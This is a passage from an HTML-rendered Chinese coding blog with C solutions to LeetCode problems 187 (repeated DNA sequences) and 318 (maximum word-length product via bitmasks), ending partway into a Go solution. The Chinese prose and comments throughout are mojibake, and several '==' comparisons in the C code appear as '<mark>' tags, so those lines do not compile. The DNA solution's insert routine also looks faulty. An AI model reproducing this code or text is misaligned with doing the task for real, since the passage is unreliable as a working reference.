class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Note: The returned array must be malloced, assume caller calls free().</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HashSize 100001</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="type">char</span>* key;</span><br><span class="line">    <span class="type">int</span> value;</span><br><span class="line">    <span class="type">int</span> used;</span><br><span class="line">&#125; HashEntry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    HashEntry* data;</span><br><span class="line">    <span class="type">int</span> size;    <span class="comment">//hashbiaoé•¿åº¦</span></span><br><span class="line">&#125; HashMap;</span><br><span class="line">HashMap* <span class="title function_">createHashMap</span><span class="params">(<span class="type">int</span> size)</span> &#123;</span><br><span class="line">    HashMap* <span class="built_in">map</span> = (HashMap*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(HashMap));</span><br><span class="line">    <span class="built_in">map</span>-&gt;data = (HashEntry*)<span class="built_in">calloc</span>(size, <span class="keyword">sizeof</span>(HashEntry));</span><br><span class="line">    <span class="built_in">map</span>-&gt;size = size;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; size; i++) &#123;</span><br><span class="line">       <span class="built_in">map</span>-&gt;data[i].used = <span class="number">0</span>; <span class="comment">// åˆå§‹åŒ–ä¸ºæœªä½¿ç”¨</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">map</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">insert</span><span class="params">(HashMap* <span class="built_in">map</span>, <span class="type">char</span>* key, <span class="type">char</span>** result, <span class="type">int</span>* returnSize)</span> &#123;</span><br><span class="line">    <span class="type">int</span> hash = <span class="built_in">abs</span>(hashString(key)) % <span class="built_in">map</span>-&gt;size;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (<span class="built_in">map</span>-&gt;data[hash].used&gt;=<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">strcmp</span>(<span class="built_in">map</span>-&gt;data[hash].key, key) &lt;mark&gt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="comment">// æ‰¾åˆ°é‡å¤çš„å­åºåˆ—ï¼Œå­˜å…¥ç»“æœæ•°ç»„</span></span><br><span class="line">           <span class="keyword">if</span> (<span class="built_in">map</span>-&gt;data[hash].used &lt;mark&gt; <span class="number">1</span>) &#123;</span><br><span class="line">                result[*returnSize] = strdup(key);</span><br><span class="line">                (*returnSize)++;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">map</span>-&gt;data[hash].used++;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        hash = <span class="built_in">abs</span>(hash + <span class="number">1</span>) % <span class="built_in">map</span>-&gt;size;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// æœªæ‰¾åˆ°é‡å¤çš„å­åºåˆ—ï¼Œæ’å…¥å½“å‰å­åºåˆ—</span></span><br><span class="line">    <span class="built_in">map</span>-&gt;data[hash].key = strdup(key);</span><br><span class="line">    <span class="built_in">map</span>-&gt;data[hash].used++;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">hashString</span><span class="params">(<span class="type">char</span>* str)</span> &#123;</span><br><span class="line">    <span class="comment">// ä¸€ä¸ªç®€å•çš„å­—ç¬¦ä¸²å“ˆå¸Œå‡½æ•°</span></span><br><span class="line">    <span class="type">int</span> hash = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (*str) &#123;</span><br><span class="line">        hash = (hash ) + *str;</span><br><span class="line">        str++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> hash;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">char</span>** <span class="title function_">findRepeatedDnaSequences</span><span class="params">(<span class="type">char</span>* s, <span class="type">int</span>* returnSize)</span> &#123;</span><br><span class="line">    <span class="type">int</span> len = <span class="built_in">strlen</span>(s);</span><br><span class="line">    <span class="keyword">if</span>(len&gt;<span class="number">10</span>)&#123;</span><br><span class="line">        HashMap* <span class="built_in">map</span> = createHashMap(HashSize);</span><br><span class="line">        <span class="type">char</span>** result = <span class="built_in">malloc</span>(len * <span class="keyword">sizeof</span>(*result));</span><br><span class="line">        *returnSize = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>;i&lt;len<span class="number">-9</span>;i++)&#123;</span><br><span class="line">               <span class="type">char</span> key[<span class="number">11</span>];</span><br><span class="line">               <span class="built_in">strncpy</span>(key,s+i,<span class="number">10</span>);</span><br><span class="line">               key[<span class="number">10</span>] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">               insert(<span class="built_in">map</span>,key,result,returnSize);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">free</span>(<span class="built_in">map</span>-&gt;data);  <span class="comment">// é‡Šæ”¾å“ˆå¸Œè¡¨ä¸­çš„é”®çš„å†…å­˜</span></span><br><span class="line">        <span class="built_in">free</span>(<span class="built_in">map</span>);</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    *returnSize = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç»“æœè¿˜æ˜¯è¶…æ—¶äº†ï¼Œï¼Œï¼Œï¼Œï¼Œ</p><p>æ—¶é—´å¤æ‚åº¦æ˜¯æ²¡é—®é¢˜çš„<code>O(n)</code>ï¼Œå…³é”®å±…ç„¶æ˜¯<code>HashSize</code>ï¼Œæ”¹æˆ<code>len*3</code>æ˜¯æœ€ä¼˜è§£ã€‚ä¿®æ”¹äº†hashç®—æ³•ï¼ŒèŠ‚çœæ—¶é—´</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Note: The returned array must be malloced, assume caller calls free().</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="type">char</span>* key;</span><br><span class="line">    <span class="type">int</span> value;</span><br><span class="line">    <span class="type">int</span> used;</span><br><span class="line">&#125; HashEntry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    HashEntry* data;</span><br><span class="line">    <span class="type">int</span> size;    <span class="comment">//hashbiaoé•¿åº¦</span></span><br><span class="line">&#125; HashMap;</span><br><span class="line"></span><br><span class="line">HashMap* <span class="title function_">createHashMap</span><span class="params">(<span class="type">int</span> size)</span> &#123;</span><br><span class="line">    HashMap* <span class="built_in">map</span> = (HashMap*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(HashMap));</span><br><span class="line">    <span class="built_in">map</span>-&gt;data = (HashEntry*)<span class="built_in">calloc</span>(size, <span class="keyword">sizeof</span>(HashEntry));</span><br><span class="line">    <span class="built_in">map</span>-&gt;size = size;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; size; i++) &#123;</span><br><span class="line">       <span class="built_in">map</span>-&gt;data[i].used = <span class="number">0</span>; <span class="comment">// åˆå§‹åŒ–ä¸ºæœªä½¿ç”¨</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">map</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">insert</span><span class="params">(HashMap* <span class="built_in">map</span>, <span class="type">char</span>* key, <span class="type">char</span>** result, <span class="type">int</span>* returnSize)</span> &#123;</span><br><span class="line">    <span class="type">int</span> hash = <span class="built_in">abs</span>(hashString(key)) % <span class="built_in">map</span>-&gt;size;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (<span class="built_in">map</span>-&gt;data[hash].used&gt;=<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">strcmp</span>(<span class="built_in">map</span>-&gt;data[hash].key, key) &lt;mark&gt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="comment">// æ‰¾åˆ°é‡å¤çš„å­åºåˆ—ï¼Œå­˜å…¥ç»“æœæ•°ç»„</span></span><br><span class="line">           <span class="keyword">if</span> (<span class="built_in">map</span>-&gt;data[hash].used &lt;mark&gt; <span class="number">1</span>) &#123;</span><br><span class="line">                result[*returnSize] = strdup(key);</span><br><span class="line">                (*returnSize)++;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">map</span>-&gt;data[hash].used++;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        hash = <span class="built_in">abs</span>(hash + <span class="number">1</span>) % <span class="built_in">map</span>-&gt;size;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// æœªæ‰¾åˆ°é‡å¤çš„å­åºåˆ—ï¼Œæ’å…¥å½“å‰å­åºåˆ—</span></span><br><span class="line">    <span class="built_in">map</span>-&gt;data[hash].key = strdup(key);</span><br><span class="line">    <span class="built_in">map</span>-&gt;data[hash].used++;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">hashString</span><span class="params">(<span class="type">char</span>* str)</span> &#123;</span><br><span class="line">    <span class="type">int</span> hash = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (*str) &#123;</span><br><span class="line">        hash = (hash &lt;&lt; <span class="number">2</span>) | (*str - <span class="string">&#x27;A&#x27;</span> + <span class="number">1</span>);</span><br><span class="line">        str++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> hash;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">char</span>** <span class="title function_">findRepeatedDnaSequences</span><span class="params">(<span class="type">char</span>* s, <span class="type">int</span>* returnSize)</span> &#123;</span><br><span class="line">    <span class="type">int</span> len = <span class="built_in">strlen</span>(s);</span><br><span class="line">    <span class="keyword">if</span>(len&gt;<span class="number">10</span>)&#123;</span><br><span class="line">        HashMap* <span class="built_in">map</span> = createHashMap(len*<span class="number">3</span>);</span><br><span class="line">        <span class="type">char</span>** result = <span class="built_in">malloc</span>(len * <span class="keyword">sizeof</span>(*result));</span><br><span class="line">        *returnSize = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>;i&lt;len<span class="number">-9</span>;i++)&#123;</span><br><span class="line">               <span class="type">char</span> key[<span class="number">11</span>];</span><br><span class="line">               <span class="built_in">strncpy</span>(key,s+i,<span class="number">10</span>);</span><br><span class="line">               key[<span class="number">10</span>] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">               insert(<span class="built_in">map</span>,key,result,returnSize);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">free</span>(<span class="built_in">map</span>-&gt;data);  <span class="comment">// é‡Šæ”¾å“ˆå¸Œè¡¨ä¸­çš„é”®çš„å†…å­˜</span></span><br><span class="line">        <span class="built_in">free</span>(<span class="built_in">map</span>);</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    *returnSize = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h4 id="DAY5-318-æœ€å¤§å•è¯é•¿åº¦ä¹˜ç§¯"><a href="#DAY5-318-æœ€å¤§å•è¯é•¿åº¦ä¹˜ç§¯" class="headerlink" title="DAY5-318.æœ€å¤§å•è¯é•¿åº¦ä¹˜ç§¯"></a>DAY5-318.æœ€å¤§å•è¯é•¿åº¦ä¹˜ç§¯</h4><p><a href="https://leetcode.cn/problems/maximum-product-of-word-lengths/">318. æœ€å¤§å•è¯é•¿åº¦ä¹˜ç§¯</a></p><h6 id="é¢˜ç›®æè¿°-4"><a href="#é¢˜ç›®æè¿°-4" class="headerlink" title="é¢˜ç›®æè¿°"></a>é¢˜ç›®æè¿°</h6><p><mark>ä¸­ç­‰<mark></p><blockquote><p>ç»™ä½ ä¸€ä¸ªå­—ç¬¦ä¸²æ•°ç»„ <code>words</code> ï¼Œæ‰¾å‡ºå¹¶è¿”å› <code>length(words[i]) * length(words[j])</code> çš„æœ€å¤§å€¼ï¼Œå¹¶ä¸”è¿™ä¸¤ä¸ªå•è¯ä¸å«æœ‰å…¬å…±å­—æ¯ã€‚å¦‚æœä¸å­˜åœ¨è¿™æ ·çš„ä¸¤ä¸ªå•è¯ï¼Œè¿”å› <code>0</code> ã€‚</p><p><strong>ç¤ºä¾‹ 1ï¼š</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">è¾“å…¥ï¼šwords = [&quot;abcw&quot;,&quot;baz&quot;,&quot;foo&quot;,&quot;bar&quot;,&quot;xtfn&quot;,&quot;abcdef&quot;]</span><br><span class="line">è¾“å‡ºï¼š16 </span><br><span class="line">è§£é‡Šï¼šè¿™ä¸¤ä¸ªå•è¯ä¸º &quot;abcw&quot;, &quot;xtfn&quot;ã€‚</span><br></pre></td></tr></table></figure><p><strong>ç¤ºä¾‹ 2ï¼š</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">è¾“å…¥ï¼šwords = [&quot;a&quot;,&quot;ab&quot;,&quot;abc&quot;,&quot;d&quot;,&quot;cd&quot;,&quot;bcd&quot;,&quot;abcd&quot;]</span><br><span class="line">è¾“å‡ºï¼š4 </span><br><span class="line">è§£é‡Šï¼šè¿™ä¸¤ä¸ªå•è¯ä¸º &quot;ab&quot;, &quot;cd&quot;ã€‚</span><br></pre></td></tr></table></figure><p><strong>ç¤ºä¾‹ 3ï¼š</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">è¾“å…¥ï¼šwords = [&quot;a&quot;,&quot;aa&quot;,&quot;aaa&quot;,&quot;aaaa&quot;]</span><br><span class="line">è¾“å‡ºï¼š0 </span><br><span class="line">è§£é‡Šï¼šä¸å­˜åœ¨è¿™æ ·çš„ä¸¤ä¸ªå•è¯ã€‚</span><br></pre></td></tr></table></figure><p><strong>æç¤ºï¼š</strong></p><ul><li><code>2 &lt;= words.length &lt;= 1000</code></li><li><code>1 &lt;= words[i].length &lt;= 1000</code></li><li><code>words[i]</code> ä»…åŒ…å«å°å†™å­—æ¯</li></ul></blockquote><h6 id="è€ƒç‚¹-3"><a href="#è€ƒç‚¹-3" class="headerlink" title="è€ƒç‚¹"></a>è€ƒç‚¹</h6><ul><li>ä½è¿ç®—-[ä½æ©ç ]</li><li>æ•°ç»„</li><li>å­—ç¬¦ä¸²</li></ul><h6 id="ä½æ©ç "><a href="#ä½æ©ç " class="headerlink" title="ä½æ©ç "></a>ä½æ©ç </h6><blockquote><p>ä½æ©ç ï¼ˆBitMaskï¼‰ï¼Œæ˜¯â€ä½ï¼ˆBitï¼‰â€œå’Œâ€æ©ç ï¼ˆMaskï¼‰â€œçš„ç»„åˆè¯ã€‚â€ä½â€œæŒ‡ä»£ç€äºŒè¿›åˆ¶æ•°æ®å½“ä¸­çš„äºŒè¿›åˆ¶ä½ï¼Œè€Œâ€æ©ç â€œæŒ‡çš„æ˜¯ä¸€ä¸²ç”¨äºä¸ç›®æ ‡æ•°æ®è¿›è¡ŒæŒ‰ä½æ“ä½œçš„äºŒè¿›åˆ¶æ•°å­—ã€‚ç»„åˆèµ·æ¥ï¼Œå°±æ˜¯â€ç”¨ä¸€ä¸²äºŒè¿›åˆ¶æ•°å­—ï¼ˆæ©ç ï¼‰å»æ“ä½œå¦ä¸€ä¸²äºŒè¿›åˆ¶æ•°å­—â€œçš„æ„æ€ã€‚</p></blockquote><p>æœ‰ä¸€ä¸ªå¾ˆç»å…¸çš„ç®—æ³•é¢˜ï¼Œè¯´æ˜¯æœ‰1000ä¸ªä¸€æ¨¡ä¸€æ ·çš„ç“¶å­ï¼Œå…¶ä¸­æœ‰999ç“¶æ˜¯æ™®é€šçš„æ°´ï¼Œæœ‰ä¸€ç“¶æ˜¯æ¯’è¯ã€‚ä»»ä½•å–ä¸‹æ¯’è¯çš„ç”Ÿç‰©éƒ½ä¼šåœ¨ä¸€æ˜ŸæœŸä¹‹åæ­»äº¡ã€‚ç°åœ¨ï¼Œä½ åªæœ‰10åªå°ç™½é¼ å’Œä¸€æ˜ŸæœŸçš„æ—¶é—´ï¼Œå¦‚ä½•æ£€éªŒå‡ºå“ªä¸ªç“¶å­é‡Œæœ‰æ¯’è¯ï¼Ÿå¦‚æœæŒ‰ç…§å¸¸è§„çš„è§£æ³•æ˜¯ä¸æ˜¯å¾ˆç¹çï¼Œæˆ‘ä»¬ä¸å¦¨æ€è€ƒä¸€ä¸‹ç”¨äºŒè¿›åˆ¶æ¥å¤„ç†ã€‚</p><p>å…·ä½“å®ç°è·Ÿ3ä¸ªè€é¼ ç¡®å®š8ä¸ªç“¶å­åŸç†ä¸€æ ·ï¼š</p><p>000&#x3D;0<br>001&#x3D;1<br>010&#x3D;2<br>011&#x3D;3<br>100&#x3D;4<br>101&#x3D;5<br>110&#x3D;6<br>111&#x3D;7</p><pre><code>12345678</code></pre><p>ä¸€ä½è¡¨ç¤ºä¸€ä¸ªè€é¼ ï¼Œ0-7è¡¨ç¤º8ä¸ªç“¶å­ã€‚ä¹Ÿå°±æ˜¯åˆ†åˆ«å°†1ã€3ã€5ã€7å·ç“¶å­çš„è¯æ··èµ·æ¥ç»™è€é¼ 1åƒï¼Œ2ã€3ã€6ã€7å·ç“¶å­çš„è¯æ··èµ·æ¥ç»™è€é¼ 2åƒï¼Œ4ã€5ã€6ã€7å·ç“¶å­çš„è¯æ··èµ·æ¥ç»™è€é¼ 3åƒï¼Œå“ªä¸ªè€é¼ æ­»äº†ï¼Œç›¸åº”çš„ä½æ ‡ä¸º1ã€‚å¦‚è€é¼ 1æ­»äº†ã€è€é¼ 2æ²¡æ­»ã€è€é¼ 3æ­»äº†ï¼Œé‚£ä¹ˆå°±æ˜¯101&#x3D;5å·ç“¶å­æœ‰æ¯’ã€‚åŒæ ·é“ç†10ä¸ªè€é¼ å¯ä»¥ç¡®å®š1000ä¸ªç“¶å­ã€‚</p><blockquote><p>å…³äºè¿™é“é¢˜</p></blockquote><ul><li>ä¸€å…±24ä¸ªå­—æ¯ï¼Œæˆ‘ä»¬å°±åˆ›å»ºä¸€ä¸ª24ä½çš„æ•°</li><li>å¯¹åº”çš„ä½ä¸Šä¸º1å°±è¯´æ˜è¯¥å•è¯å­˜åœ¨è¯¥å­—æ¯</li><li>ä¸¤ä¸ªå•è¯æ„é€ å‡ºçš„æ•°è¿›è¡ŒæŒ‰ä½ä¸</li><li>å¦‚æœå€¼å¤§äº1è¯´æ˜æœ‰çš„ä½ä¸¤ä¸ªæ•°éƒ½æ˜¯1ï¼Œå°±ä¸æ»¡è¶³æ¡ä»¶</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> mask1 = <span class="number">0</span>, mask2 = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// æ„å»ºä½æ©ç </span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; word1[i] != <span class="string">&#x27;\0&#x27;</span>; ++i) &#123;</span><br><span class="line">    mask1 |= (<span class="number">1</span> &lt;&lt; (word1[i] - <span class="string">&#x27;a&#x27;</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; word2[i] != <span class="string">&#x27;\0&#x27;</span>; ++i) &#123;</span><br><span class="line">    mask2 |= (<span class="number">1</span> &lt;&lt; (word2[i] - <span class="string">&#x27;a&#x27;</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// å¦‚æœä¸¤ä¸ªä½æ©ç çš„ä¸è¿ç®—ç»“æœä¸º0ï¼Œè¡¨ç¤ºæ²¡æœ‰å…¬å…±å­—æ¯</span></span><br><span class="line"><span class="keyword">return</span> (mask1 &amp; mask2) &lt;mark&gt; <span class="number">0</span>;</span><br></pre></td></tr></table></figure><p>æœ‰æ•ˆé™ä½è¿™é“é¢˜çš„æ—¶é—´å¤æ‚åº¦</p><h6 id="C"><a href="#C" class="headerlink" title="C"></a>C</h6><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">maxProduct</span><span class="params">(<span class="type">char</span> ** words, <span class="type">int</span> wordsSize)</span>&#123;</span><br><span class="line">    <span class="type">int</span> max = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>;i &lt;wordsSize; i++) &#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j = i+<span class="number">1</span>;j &lt;wordsSize;j++) &#123;</span><br><span class="line">            <span class="type">int</span> mask1 = <span class="number">0</span>;</span><br><span class="line">            <span class="type">int</span> mask2 = <span class="number">0</span>;</span><br><span class="line">            <span class="type">int</span> leni = <span class="built_in">strlen</span>(words[i]);</span><br><span class="line">            <span class="type">int</span> lenj = <span class="built_in">strlen</span>(words[j]);</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> m = <span class="number">0</span>; m &lt; leni; m++) &#123;</span><br><span class="line">                mask1 |= <span class="number">1</span> &lt;&lt; (words[i][m] - <span class="string">&#x27;a&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> n = <span class="number">0</span>; n &lt; lenj; n++) &#123;</span><br><span class="line">                mask2 |= <span class="number">1</span> &lt;&lt; (words[j][n] - <span class="string">&#x27;a&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>((mask1 &amp; mask2) != <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="type">int</span> len1 = <span class="built_in">strlen</span>(words[i]);</span><br><span class="line">                <span class="type">int</span> len2 = <span class="built_in">strlen</span>(words[j]);</span><br><span class="line">                <span class="type">int</span> product = len1*len2;</span><br><span class="line">                <span class="keyword">if</span>(product &gt; max) &#123;</span><br><span class="line">                    max = product;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> max;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">char</span> *words[] = &#123;<span class="string">&quot;a&quot;</span>,<span class="string">&quot;ba&quot;</span>,<span class="string">&quot;bc&quot;</span>&#125;;</span><br><span class="line">    <span class="type">int</span> wordsSize =  <span class="keyword">sizeof</span>(words) / <span class="keyword">sizeof</span>(words[<span class="number">0</span>]);</span><br><span class="line">    <span class="type">int</span> result = maxProduct(words, wordsSize);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,result);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>å¥½å¥½å¥½ï¼Œç”¨äº†ä½è¿ç®—è¿˜æ˜¯è¶…æ—¶æ˜¯å§</li><li>ç­‰ç­‰ï¼ŒæŠŠå¾ªç¯çš„åœ°æ–¹strlenæ”¾åˆ°å¾ªç¯å‰å°±è¿‡äº†ï¼Œ</li><li>æ—¶é—´è¿˜æ˜¯å¤ªæ…¢äº†ï¼Œå‡»è´¥5%å“ˆå“ˆ</li></ul><h6 id="Go-1"><a href="#Go-1" class="headerlink" title="Go"></a>Go</h6><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span 